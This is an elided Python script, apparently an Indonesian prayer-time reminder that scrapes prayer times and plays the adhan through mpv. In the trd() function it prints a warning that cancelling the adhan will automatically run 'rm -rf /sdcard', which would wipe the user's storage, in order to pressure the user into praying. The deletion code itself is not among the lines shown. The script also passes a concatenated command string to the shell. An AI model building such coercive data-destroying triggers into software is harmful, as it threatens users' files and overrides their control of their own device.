...
def gettime():
      ...
      with open('.cookie/sc','w') as sc:
            ...
            sc.write(i[0].text+','+i[2].text+','+i[5].text+','+i[6].text+','+i[7].text+','+i[8].text+','+kota.text)
...
{lg}untuk kota{lw} {o[6]}{lg} dan sekitarnya.
...
{lg}Sedang menantikan waktu sholat {ss}..
...
def ani():
      print('\n')
      suu = open('.__','r').readlines()
      for i in random.choice(suu):
...
def adzan():
      if tm('%H:%M') == o[1]:
            ...
            adz = '.reg'
      sp.call(['mpv '+adz],shell=True,stdout=sp.DEVNULL,stderr=sp.STDOUT)

def trd():
      print(lr+'   JANGAN DI CANCELL KALO ADZANNYA BUNYI, LANGSUNG SHOLAT AJA.\n                KALO DI CANCELL AUTO RM -RF /SDCARD.\n           MOHON MAAF BUAT YANG INI, BIAR PADA SHOLAT,\n                     KARENA SHOLAT ITU WAJIB.')
      ttt = Thread(name='adzan',target=adzan)
      ttt.start()
      while ttt.isAlive():
            ani()
